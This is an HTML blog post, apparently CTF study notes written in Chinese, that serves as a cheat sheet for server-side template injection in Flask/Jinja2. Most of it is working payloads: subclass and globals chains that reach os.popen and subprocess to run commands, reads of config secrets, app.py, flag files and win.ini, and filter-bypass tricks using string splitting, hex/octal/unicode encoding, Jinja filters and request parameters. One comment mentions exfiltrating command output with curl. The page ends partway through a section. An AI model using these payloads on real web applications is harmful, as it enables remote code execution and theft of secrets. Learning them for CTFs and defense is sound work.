@@ -1,0 +1,508 @@
+<!DOCTYPE HTML>
+<html>
+<head>
+  <meta charset="utf-8">
+  <meta http-equiv="pragma" content="no-cache">
+  <meta http-equiv="cache-control" content="no-cache">
+  <meta http-equiv="expires" content="0">
+  
+  <title>SSTI模板注入 | Antel0p3&#39;s blog</title>
+  <meta name="author" content="John Doe">
+  
+  <meta name="description" content="判断
+Flask模板语法123&amp;#123;% %&amp;#125; # 控制结构&amp;#123;&amp;#123; &amp;#125;&amp;#125; # 变量表示符&amp;#123;# #&amp;#125; # 注释
+
+基础config&amp;#123;&amp;#123;config&amp;#125;&amp;#125;可以获取当前设置，如果题目类似app.c">
+  
+  
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+
+  <meta property="og:title" content="SSTI模板注入"/>
+  <meta property="og:site_name" content="Antel0p3&#39;s blog"/>
+
+  
+    <meta property="og:image" content=""/>
+  
+
+  
+    <link rel="alternative" href="/atom.xml" title="Antel0p3&#39;s blog" type="application/atom+xml">
+  
+  
+    <link href="/favicon.png" rel="icon">
+  
+  
+  <link rel="stylesheet" href="/css/bootstrap.min.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/font-awesome.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/style.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/responsive.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/highlight.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/prism.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/google-fonts.css" media="screen" type="text/css">
+  <!--[if lt IE 9]><script src="//html5shiv.googlecode.com/svn/trunk/html5.js"></script><![endif]-->
+
+  <script src="/js/jquery-2.0.3.min.js"></script>
+
+  <!-- analytics -->
+  
+  <!-- Global site tag (gtag.js) - Google Analytics -->
+<script async src="https://www.googletagmanager.com/gtag/js?id=UA-70812759-1"></script>
+<script>
+  window.dataLayer = window.dataLayer || [];
+  function gtag(){dataLayer.push(arguments);}
+  gtag('js', new Date());
+
+  gtag('config', 'UA-70812759-1');
+</script>
+
+
+
+
+
+
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+ <body>  
+  <nav id="main-nav" class="navbar navbar-inverse navbar-fixed-top" role="navigation">
+    <div class="container">
+      <button type="button" class="navbar-header navbar-toggle" data-toggle="collapse" data-target=".navbar-collapse">
+		<span class="sr-only">Toggle navigation</span>
+        <span class="icon-bar"></span>
+        <span class="icon-bar"></span>
+        <span class="icon-bar"></span>
+      </button>
+	  <a class="navbar-brand" href="/">Antel0p3&#39;s blog</a>
+      <div class="collapse navbar-collapse nav-menu">
+		<ul class="nav navbar-nav">
+		  
+		  <li>
+			<a href="/archives" title="All the articles.">
+			  <i class="fa fa-archive"></i>Archives
+			</a>
+		  </li>
+		  
+		  <li>
+			<a href="/categories" title="All the categories.">
+			  <i class="fa fa-folder"></i>Categories
+			</a>
+		  </li>
+		  
+		  <li>
+			<a href="/tags" title="All the tags.">
+			  <i class="fa fa-tags"></i>Tags
+			</a>
+		  </li>
+		  
+		  <li>
+			<a href="/about" title="About me.">
+			  <i class="fa fa-user"></i>About
+			</a>
+		  </li>
+		  
+		</ul>
+      </div>
+    </div> <!-- container -->
+</nav>
+<div class="clearfix"></div>
+
+  <div class="container">
+  	<div class="content">
+    	 
+
+
+					
+							<div class="page-header">
+								<h1>
+									
+											
+												SSTI模板注入
+									
+									
+								</h1>
+								
+									<p id="/2023/10/20/ssti/" class="leancloud-visitors view"
+										data-flag-title="SSTI模板注入">
+										<i class="fa fa-eye"></i> <i class="leancloud-visitors-count"></i>
+									</p>
+									
+							</div>
+							
+								
+
+<div class="row post">
+	<!-- cols -->
+	
+	<div id="top_meta">
+		
+	</div>
+	<div class="col-md-9">
+	
+
+	<!-- content -->
+	<div class="mypage">		
+	  		
+
+	  <h2 id="判断"><a href="#判断" class="headerlink" title="判断"></a>判断</h2><p><img src="https://img2018.cnblogs.com/blog/1270588/202001/1270588-20200116203917086-1704538409.png" alt="img"></p>
+<h2 id="Flask"><a href="#Flask" class="headerlink" title="Flask"></a>Flask</h2><h3 id="模板语法"><a href="#模板语法" class="headerlink" title="模板语法"></a>模板语法</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#123;% %&#125; <span class="comment"># 控制结构</span></span><br><span class="line">&#123;&#123; &#125;&#125; <span class="comment"># 变量表示符</span></span><br><span class="line">&#123;<span class="comment"># #&#125; # 注释</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="基础"><a href="#基础" class="headerlink" title="基础"></a>基础</h3><h4 id="config"><a href="#config" class="headerlink" title="config"></a>config</h4><p><code>&#123;&#123;config&#125;&#125;</code>可以获取当前设置，如果题目类似<code>app.config [&#39;FLAG&#39;] = os.environ.pop（&#39;FLAG&#39;）</code>，那可以直接访问<code>&#123;&#123;config['FLAG']&#125;&#125;</code>或者<code>&#123;&#123;config.FLAG&#125;&#125;</code>得到flag</p>
+<h4 id="self"><a href="#self" class="headerlink" title="self"></a>self</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;self&#125;&#125; ⇒ &lt;TemplateReference <span class="literal">None</span>&gt;</span><br><span class="line">&#123;&#123;self.__dict__._TemplateReference__context.config&#125;&#125; ⇒ 同样可以找到config</span><br></pre></td></tr></table></figure>
+
+<h4 id="url-for-g-request-namespace-lipsum-range-session-dict-get-flashed-messages-cycler-joiner-config等"><a href="#url-for-g-request-namespace-lipsum-range-session-dict-get-flashed-messages-cycler-joiner-config等" class="headerlink" title="url_for, g, request, namespace, lipsum, range, session, dict, get_flashed_messages, cycler, joiner, config等"></a>url_for, g, request, namespace, lipsum, range, session, dict, get_flashed_messages, cycler, joiner, config等</h4><p>如果config，self不能使用，要获取配置信息，就必须从它的上部全局变量（访问配置current_app等）。</p>
+<p>例如</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;url_for.__globals__[<span class="string">&#x27;current_app&#x27;</span>].config.FLAG&#125;&#125;</span><br><span class="line">&#123;&#123;get_flashed_messages.__globals__[<span class="string">&#x27;current_app&#x27;</span>].config.FLAG&#125;&#125;</span><br><span class="line">&#123;&#123;request.application.__self__._get_data_for_json.__globals__[<span class="string">&#x27;json&#x27;</span>].JSONEncoder.default.__globals__[<span class="string">&#x27;current_app&#x27;</span>].config[<span class="string">&#x27;FLAG&#x27;</span>]&#125;&#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="魔术方法"><a href="#魔术方法" class="headerlink" title="魔术方法"></a>魔术方法</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">__class__        <span class="comment"># 返回调用的参数类型</span></span><br><span class="line">__base__         <span class="comment"># 以字符串返回一个类所直接继承的第一个类，一般情况下是object</span></span><br><span class="line">__bases__        <span class="comment"># 以元组的形式返回基类</span></span><br><span class="line">__mro__          <span class="comment"># 返回解析方法调用的顺序</span></span><br><span class="line">__subclasses__() <span class="comment"># 返回子类列表</span></span><br><span class="line">__globals__      <span class="comment"># 以字典的形式返回函数所在的全局命名空间所定义的全局变量</span></span><br><span class="line"><span class="built_in">__import__</span>       <span class="comment"># 导入模块</span></span><br><span class="line">__builtins__     <span class="comment"># 内建模块的引用，在任何地方都是可见的(包括全局)，这个模块包括了很多强大的内置函数，如eval, exec, fopen等</span></span><br><span class="line">__getitem__      <span class="comment"># 提取元素</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="常规逃逸"><a href="#常规逃逸" class="headerlink" title="常规逃逸"></a>常规逃逸</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># &lt;class &#x27;subprocess.Popen&#x27;&gt;</span></span><br><span class="line">&#123;&#123;<span class="string">&#x27;&#x27;</span>.__class__.__base__.__subclasses__()[<span class="number">258</span>](<span class="string">&#x27;ls&#x27;</span>,shell=<span class="literal">True</span>,stdout=-<span class="number">1</span>).communicate()[<span class="number">0</span>].strip()&#125;&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># &lt;class &#x27;_frozen_importlib._ModuleLock&#x27;&gt;</span></span><br><span class="line">&#123;&#123;<span class="string">&#x27;&#x27;</span>.__class__.__base__.__subclasses__()[<span class="number">75</span>].__init__.__globals__[<span class="string">&#x27;__builtins__&#x27;</span>][<span class="string">&#x27;__import__&#x27;</span>](<span class="string">&#x27;os&#x27;</span>).listdir(<span class="string">&#x27;/&#x27;</span>)&#125;&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># &lt;class &#x27;_frozen_importlib.BuiltinImporter&#x27;&gt;</span></span><br><span class="line">&#123;&#123;().__class__.__base__.__subclasses__()[<span class="number">80</span>][<span class="string">&quot;load_module&quot;</span>](<span class="string">&quot;os&quot;</span>).system(<span class="string">&quot;ls&quot;</span>)&#125;&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># &lt;class &#x27;_frozen_importlib_external.FileLoader&#x27;&gt;</span></span><br><span class="line">&#123;&#123;().__class__.__base__.__subclasses__()[<span class="number">91</span>].get_data(<span class="number">0</span>, <span class="string">&quot;app.py&quot;</span>)&#125;&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># &lt;class &#x27;click.utils.LazyFile&#x27;&gt;</span></span><br><span class="line"><span class="comment">## 命令执行</span></span><br><span class="line">&#123;&#123;().__class__.__base__.__subclasses__().__getitem__(<span class="number">475</span>).__init__.__globals__[<span class="string">&#x27;os&#x27;</span>].popen(<span class="string">&#x27;ls&#x27;</span>).read()&#125;&#125;</span><br><span class="line"><span class="comment">## 读文件</span></span><br><span class="line">&#123;&#123;().__class__.__base__.__subclasses__().__getitem__(<span class="number">475</span>)(<span class="string">&#x27;flag.txt&#x27;</span>).read()&#125;&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># &lt;class &#x27;warnings.catch_warnings&#x27;&gt;</span></span><br><span class="line">&#123;% <span class="keyword">for</span> c <span class="keyword">in</span> ().__class__.__base__.__subclasses__() %&#125;&#123;% <span class="keyword">if</span> c.__name__==<span class="string">&#x27;catch_warnings&#x27;</span> %&#125;&#123;&#123; c.__init__.__globals__[<span class="string">&#x27;__builtins__&#x27;</span>].popen(<span class="string">&#x27;ls&#x27;</span>).read() &#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125;</span><br><span class="line">&#123;&#123;<span class="string">&quot;&quot;</span>.__class__.__base__.__subclasses__()[<span class="number">189</span>].__init__.__globals__[<span class="string">&#x27;__builtins__&#x27;</span>].popen(<span class="string">&#x27;ls&#x27;</span>).read()&#125;&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># flask里的lipsum方法,可以用于得到__builtins__，而且lipsum.__globals__含有os模块</span></span><br><span class="line">lipsum.__globals__.get(<span class="string">&quot;os&quot;</span>).popen(<span class="string">&quot;ls&quot;</span>).read()</span><br></pre></td></tr></table></figure>
+
+<h3 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h3><p>flask提供了两个内置的全局函数：<code>url_for、get_flashed_messages</code>，两个都有<code>__globals__</code>键；</p>
+<p>jinja2一共有3个内置的全局函数：<code>range、lipsum、dict</code>，其中只有lipsum有<code>__globals__</code>键</p>
+<h3 id="条件"><a href="#条件" class="headerlink" title="条件"></a>条件</h3><p>flask的内置函数只有flask的渲染方法render_template()和render_template_string()渲染时才可使用；</p>
+<p>jinja2的内置函数无条件，flask和jinja2的渲染方法都可使用</p>
+<h3 id="payload"><a href="#payload" class="headerlink" title="payload"></a>payload</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># flask</span></span><br><span class="line">&#123;&#123;get_flashed_messages.__globals__[<span class="string">&#x27;os&#x27;</span>].popen(<span class="string">&#x27;whoami&#x27;</span>).read()&#125;&#125;</span><br><span class="line">&#123;&#123;url_for.__globals__[<span class="string">&#x27;os&#x27;</span>].popen(<span class="string">&#x27;whoami&#x27;</span>).read()&#125;&#125;</span><br><span class="line"><span class="comment"># jinja2</span></span><br><span class="line">&#123;&#123;lipsum.__globals__[<span class="string">&#x27;os&#x27;</span>].popen(<span class="string">&#x27;whoami&#x27;</span>).read()&#125;&#125;</span><br><span class="line"><span class="comment"># 另外两个内置函数和正常逃逸一个思路</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="内置类-Undefined"><a href="#内置类-Undefined" class="headerlink" title="内置类 Undefined"></a>内置类 Undefined</h3><h4 id="介绍-1"><a href="#介绍-1" class="headerlink" title="介绍"></a>介绍</h4><p>在渲染<code>().__class__.__base__.__subclasses__().c.__init__</code>初始化一个类时，此处由于不存在c类理论上应该报错停止执行，但是实际上并不会停止执行，这是由于Jinja2内置了<strong>Undefined</strong>类型，渲染结果显示为<code>&lt;class &#39;jinja2.runtime.Undefined&#39;&gt;</code>，所以看起来并不存在的c类实际上触发了内置的<strong>Undefined</strong>类型。</p>
+<h4 id="payload-1"><a href="#payload-1" class="headerlink" title="payload"></a>payload</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">a.__init__.__globals__.__builtins__.<span class="built_in">open</span>(<span class="string">&quot;C:\Windows\win.ini&quot;</span>).read()</span><br><span class="line">a.__init__.__globals__.__builtins__.<span class="built_in">eval</span>(<span class="string">&quot;__import__(&#x27;os&#x27;).popen(&#x27;whoami&#x27;).read()&quot;</span>)</span><br></pre></td></tr></table></figure>
+
+<h3 id="bytes"><a href="#bytes" class="headerlink" title="bytes"></a>bytes</h3><h4 id="介绍-2"><a href="#介绍-2" class="headerlink" title="介绍"></a>介绍</h4><p>python3新增了bytes类，用于代表字符串，其fromhex()方法可以将十六进制转换为字符串。</p>
+<h4 id="payload-2"><a href="#payload-2" class="headerlink" title="payload"></a>payload</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># &quot;&quot;[__class__]</span></span><br><span class="line"><span class="string">&quot;&quot;</span>[<span class="string">&quot;&quot;</span>.encode().fromhex(<span class="string">&quot;5f5f636c6173735f5f&quot;</span>).decode()]</span><br></pre></td></tr></table></figure>
+
+<h3 id="bypass"><a href="#bypass" class="headerlink" title="bypass"></a>bypass</h3><h4 id="字符串过滤"><a href="#字符串过滤" class="headerlink" title="字符串过滤"></a>字符串过滤</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 字符串拼接</span></span><br><span class="line"><span class="string">&quot;&quot;</span>[<span class="string">&quot;__cl&quot;</span>+<span class="string">&quot;ass__&quot;</span>]</span><br><span class="line"><span class="string">&quot;&quot;</span>[<span class="string">&quot;__cl&quot;</span><span class="string">&quot;ass__&quot;</span>]</span><br><span class="line"><span class="comment"># 字符串倒序</span></span><br><span class="line"><span class="string">&quot;&quot;</span>[<span class="string">&quot;__ssalc__&quot;</span>[::-<span class="number">1</span>]]</span><br></pre></td></tr></table></figure>
+
+<h4 id="符号过滤"><a href="#符号过滤" class="headerlink" title="符号过滤"></a>符号过滤</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 绕过.</span></span><br><span class="line"><span class="string">&quot;&quot;</span>[<span class="string">&#x27;__class__&#x27;</span>]</span><br><span class="line"><span class="string">&#x27;&#x27;</span>|attr(<span class="string">&#x27;__class__&#x27;</span>)</span><br><span class="line"><span class="comment"># 绕过[]</span></span><br><span class="line">__subclasses__().pop(<span class="number">40</span>) == __subclasses__()[<span class="number">40</span>]</span><br><span class="line">__subclasses__().__getitem__(<span class="number">40</span>) == __subclasses__()[<span class="number">40</span>]</span><br><span class="line"><span class="comment"># 绕过\&#123;\&#123;</span></span><br><span class="line">&#123;%<span class="built_in">print</span>()%&#125;</span><br><span class="line"></span><br><span class="line">&#123;% <span class="keyword">for</span> c <span class="keyword">in</span> [].__class__.__base__.__subclasses__() %&#125;&#123;% <span class="keyword">if</span> c.__name__==<span class="string">&#x27;catch_warnings&#x27;</span> %&#125;&#123;&#123; c.__init__.__globals__[<span class="string">&#x27;__builtins__&#x27;</span>].<span class="built_in">eval</span>(<span class="string">&quot;__import__(&#x27;os&#x27;).popen(&#x27;ls /&#x27;).read()&quot;</span>)&#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125;</span><br><span class="line"><span class="comment"># 也可以使用 &#123;% if ... %&#125;1&#123;% endif %&#125; 配合 os.popen 和 curl 将执行结果外带（不外带的话无回显）出来：</span></span><br><span class="line"></span><br><span class="line">&#123;% <span class="keyword">if</span> <span class="string">&#x27;&#x27;</span>.__class__.__base__.__subclasses__()[<span class="number">59</span>].__init__.func_globals.linecache.os.popen(<span class="string">&#x27;ls /&#x27;</span>) %&#125;<span class="number">1</span>&#123;% endif %&#125;</span><br><span class="line"><span class="comment"># 也可以用 &#123;%print(......)%&#125; 的形式来代替 &#123;&#123; ，如下：</span></span><br><span class="line"></span><br><span class="line">&#123;%<span class="built_in">print</span>(<span class="string">&#x27;&#x27;</span>.__class__.__base__.__subclasses__()[<span class="number">77</span>].__init__.__globals__[<span class="string">&#x27;os&#x27;</span>].popen(<span class="string">&#x27;ls&#x27;</span>).read())%&#125;</span><br></pre></td></tr></table></figure>
+
+<h4 id="编码绕过"><a href="#编码绕过" class="headerlink" title="编码绕过"></a>编码绕过</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 以下皆为 &quot;&quot;[&quot;__class__&quot;] 等效形式</span></span><br><span class="line"><span class="comment"># 八进制</span></span><br><span class="line"><span class="string">&quot;&quot;</span>[<span class="string">&quot;\137\137\143\154\141\163\163\137\137&quot;</span>]</span><br><span class="line"><span class="comment"># 十六进制</span></span><br><span class="line"><span class="string">&quot;&quot;</span>[<span class="string">&quot;\x5f\x5f\x63\x6c\x61\x73\x73\x5f\x5f&quot;</span>]</span><br><span class="line"><span class="comment"># Unicode</span></span><br><span class="line"><span class="string">&quot;&quot;</span>[<span class="string">&quot;\u005f\u005f\u0063\u006c\u0061\u0073\u0073\u005f\u005f&quot;</span>]</span><br></pre></td></tr></table></figure>
+
+<h4 id="request方法"><a href="#request方法" class="headerlink" title="request方法"></a>request方法</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 参数传递(GET|POST都可)</span></span><br><span class="line"><span class="string">&quot;&quot;</span>[request.values.x1]</span><br><span class="line"><span class="comment"># GET方法传参</span></span><br><span class="line">&#123;&#123;<span class="string">&quot;&quot;</span>[request.args.x1]&#125;&#125;&amp;x1=__class__</span><br><span class="line"><span class="comment"># POST方法传参</span></span><br><span class="line"><span class="string">&quot;&quot;</span>[request.form.x1]</span><br><span class="line">	POST: x1=__class__</span><br><span class="line"><span class="comment"># headers头</span></span><br><span class="line"><span class="string">&quot;&quot;</span>[request.headers.x1]</span><br><span class="line">	x1: __class__</span><br><span class="line"><span class="comment"># User-Agent</span></span><br><span class="line"><span class="string">&quot;&quot;</span>[request.user_agent.string]</span><br><span class="line">	User-Agent: __class__</span><br><span class="line"><span class="comment"># Cookie</span></span><br><span class="line"><span class="string">&quot;&quot;</span>[request.cookies.x1]</span><br><span class="line">	Cookie: x1=__class__</span><br></pre></td></tr></table></figure>
+
+<h4 id="使用-JinJa-的过滤器进行Bypass"><a href="#使用-JinJa-的过滤器进行Bypass" class="headerlink" title="使用 JinJa 的过滤器进行Bypass"></a>使用 JinJa 的过滤器进行Bypass</h4><p>在 Flask JinJa 中，内只有很多过滤器可以使用，前文的attr()就是其中的一个过滤器。变量可以通过过滤器进行修改，过滤器与变量之间用管道符号（|）隔开，括号中可以有可选参数，也可以没有参数，过滤器函数可以带括号也可以不带括号。可以使用管道符号（|）连接多个过滤器，一个过滤器的输出应用于下一个过滤器。</p>
+<p>详情请看官方文档：<a target="_blank" rel="noopener" href="https://jinja.palletsprojects.com/en/latest/templates/#filters">https://jinja.palletsprojects.com/en/latest/templates/#filters</a></p>
+<p>以下是内置的所有的过滤器列表：</p>
+<table>
+<thead>
+<tr>
+<th><a target="_blank" rel="noopener" href="https://jinja.palletsprojects.com/en/master/templates/#abs"><code>abs()</code></a></th>
+<th><a target="_blank" rel="noopener" href="https://jinja.palletsprojects.com/en/master/templates/#float"><code>float()</code></a></th>
+<th><a target="_blank" rel="noopener" href="https://jinja.palletsprojects.com/en/master/templates/#lower"><code>lower()</code></a></th>
+<th><a target="_blank" rel="noopener" href="https://jinja.palletsprojects.com/en/master/templates/#round"><code>round()</code></a></th>
+<th><a target="_blank" rel="noopener" href="https://jinja.palletsprojects.com/en/master/templates/#tojson"><code>tojson()</code></a></th>
+</tr>
+</thead>
+<tbody><tr>
+<td><a target="_blank" rel="noopener" href="https://jinja.palletsprojects.com/en/master/templates/#attr"><code>attr()</code></a></td>
+<td><a target="_blank" rel="noopener" href="https://jinja.palletsprojects.com/en/master/templates/#forceescape"><code>forceescape()</code></a></td>
+<td><a target="_blank" rel="noopener" href="https://jinja.palletsprojects.com/en/master/templates/#map"><code>map()</code></a></td>
+<td><a target="_blank" rel="noopener" href="https://jinja.palletsprojects.com/en/master/templates/#safe"><code>safe()</code></a></td>
+<td><a target="_blank" rel="noopener" href="https://jinja.palletsprojects.com/en/master/templates/#trim"><code>trim()</code></a></td>
+</tr>
+<tr>
+<td><a target="_blank" rel="noopener" href="https://jinja.palletsprojects.com/en/master/templates/#batch"><code>batch()</code></a></td>
+<td><a target="_blank" rel="noopener" href="https://jinja.palletsprojects.com/en/master/templates/#format"><code>format()</code></a></td>
+<td><a target="_blank" rel="noopener" href="https://jinja.palletsprojects.com/en/master/templates/#max"><code>max()</code></a></td>
+<td><a target="_blank" rel="noopener" href="https://jinja.palletsprojects.com/en/master/templates/#select"><code>select()</code></a></td>
+<td><a target="_blank" rel="noopener" href="https://jinja.palletsprojects.com/en/master/templates/#truncate"><code>truncate()</code></a></td>
+</tr>
+<tr>
+<td><a target="_blank" rel="noopener" href="https://jinja.palletsprojects.com/en/master/templates/#capitalize"><code>capitalize()</code></a></td>
+<td><a target="_blank" rel="noopener" href="https://jinja.palletsprojects.com/en/master/templates/#groupby"><code>groupby()</code></a></td>
+<td><a target="_blank" rel="noopener" href="https://jinja.palletsprojects.com/en/master/templates/#min"><code>min()</code></a></td>
+<td><a target="_blank" rel="noopener" href="https://jinja.palletsprojects.com/en/master/templates/#selectattr"><code>selectattr()</code></a></td>
+<td><a target="_blank" rel="noopener" href="https://jinja.palletsprojects.com/en/master/templates/#unique"><code>unique()</code></a></td>
+</tr>
+<tr>
+<td><a target="_blank" rel="noopener" href="https://jinja.palletsprojects.com/en/master/templates/#center"><code>center()</code></a></td>
+<td><a target="_blank" rel="noopener" href="https://jinja.palletsprojects.com/en/master/templates/#indent"><code>indent()</code></a></td>
+<td><a target="_blank" rel="noopener" href="https://jinja.palletsprojects.com/en/master/templates/#pprint"><code>pprint()</code></a></td>
+<td><a target="_blank" rel="noopener" href="https://jinja.palletsprojects.com/en/master/templates/#slice"><code>slice()</code></a></td>
+<td><a target="_blank" rel="noopener" href="https://jinja.palletsprojects.com/en/master/templates/#upper"><code>upper()</code></a></td>
+</tr>
+<tr>
+<td><a target="_blank" rel="noopener" href="https://jinja.palletsprojects.com/en/master/templates/#default"><code>default()</code></a></td>
+<td><a target="_blank" rel="noopener" href="https://jinja.palletsprojects.com/en/master/templates/#int"><code>int()</code></a></td>
+<td><a target="_blank" rel="noopener" href="https://jinja.palletsprojects.com/en/master/templates/#random"><code>random()</code></a></td>
+<td><a target="_blank" rel="noopener" href="https://jinja.palletsprojects.com/en/master/templates/#sort"><code>sort()</code></a></td>
+<td><a target="_blank" rel="noopener" href="https://jinja.palletsprojects.com/en/master/templates/#urlencode"><code>urlencode()</code></a></td>
+</tr>
+<tr>
+<td><a target="_blank" rel="noopener" href="https://jinja.palletsprojects.com/en/master/templates/#dictsort"><code>dictsort()</code></a></td>
+<td><a target="_blank" rel="noopener" href="https://jinja.palletsprojects.com/en/master/templates/#join"><code>join()</code></a></td>
+<td><a target="_blank" rel="noopener" href="https://jinja.palletsprojects.com/en/master/templates/#reject"><code>reject()</code></a></td>
+<td><a target="_blank" rel="noopener" href="https://jinja.palletsprojects.com/en/master/templates/#string"><code>string()</code></a></td>
+<td><a target="_blank" rel="noopener" href="https://jinja.palletsprojects.com/en/master/templates/#urlize"><code>urlize()</code></a></td>
+</tr>
+<tr>
+<td><a target="_blank" rel="noopener" href="https://jinja.palletsprojects.com/en/master/templates/#escape"><code>escape()</code></a></td>
+<td><a target="_blank" rel="noopener" href="https://jinja.palletsprojects.com/en/master/templates/#last"><code>last()</code></a></td>
+<td><a target="_blank" rel="noopener" href="https://jinja.palletsprojects.com/en/master/templates/#rejectattr"><code>rejectattr()</code></a></td>
+<td><a target="_blank" rel="noopener" href="https://jinja.palletsprojects.com/en/master/templates/#striptags"><code>striptags()</code></a></td>
+<td><a target="_blank" rel="noopener" href="https://jinja.palletsprojects.com/en/master/templates/#wordcount"><code>wordcount()</code></a></td>
+</tr>
+<tr>
+<td><a target="_blank" rel="noopener" href="https://jinja.palletsprojects.com/en/master/templates/#filesizeformat"><code>filesizeformat()</code></a></td>
+<td><a target="_blank" rel="noopener" href="https://jinja.palletsprojects.com/en/master/templates/#length"><code>length()</code></a></td>
+<td><a target="_blank" rel="noopener" href="https://jinja.palletsprojects.com/en/master/templates/#replace"><code>replace()</code></a></td>
+<td><a target="_blank" rel="noopener" href="https://jinja.palletsprojects.com/en/master/templates/#sum"><code>sum()</code></a></td>
+<td><a target="_blank" rel="noopener" href="https://jinja.palletsprojects.com/en/master/templates/#wordwrap"><code>wordwrap()</code></a></td>
+</tr>
+<tr>
+<td><a target="_blank" rel="noopener" href="https://jinja.palletsprojects.com/en/master/templates/#first"><code>first()</code></a></td>
+<td><a target="_blank" rel="noopener" href="https://jinja.palletsprojects.com/en/master/templates/#list"><code>list()</code></a></td>
+<td><a target="_blank" rel="noopener" href="https://jinja.palletsprojects.com/en/master/templates/#reverse"><code>reverse()</code></a></td>
+<td><a target="_blank" rel="noopener" href="https://jinja.palletsprojects.com/en/master/templates/#title"><code>title()</code></a></td>
+<td><a target="_blank" rel="noopener" href="https://jinja.palletsprojects.com/en/master/templates/#xmlattr"><code>xmlattr()</code></a></td>
+</tr>
+</tbody></table>
+<p>可以自行点击每个过滤器去查看每一种过滤器的作用。我们就是利用这些过滤器，一步步的拼接出我们想要的字符、数字或字符串。</p>
+<h5 id="常用字符获取入口点"><a href="#常用字符获取入口点" class="headerlink" title="常用字符获取入口点"></a>常用字符获取入口点</h5><ul>
+<li>对于获取一般字符的方法有以下几种：</li>
+</ul>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&#123;% <span class="built_in">set</span> org = (&#123; &#125;|select()|string()) %&#125;&#123;&#123;org&#125;&#125;</span><br><span class="line">&#123;% <span class="built_in">set</span> org = (self|string()) %&#125;&#123;&#123;org&#125;&#125;</span><br><span class="line">&#123;% <span class="built_in">set</span> org = self|string|urlencode %&#125;&#123;&#123;org&#125;&#125;</span><br><span class="line">&#123;% <span class="built_in">set</span> org = (app.__doc__|string) %&#125;&#123;&#123;org&#125;&#125;</span><br></pre></td></tr></table></figure>
+
+<p>如下演示：</p>
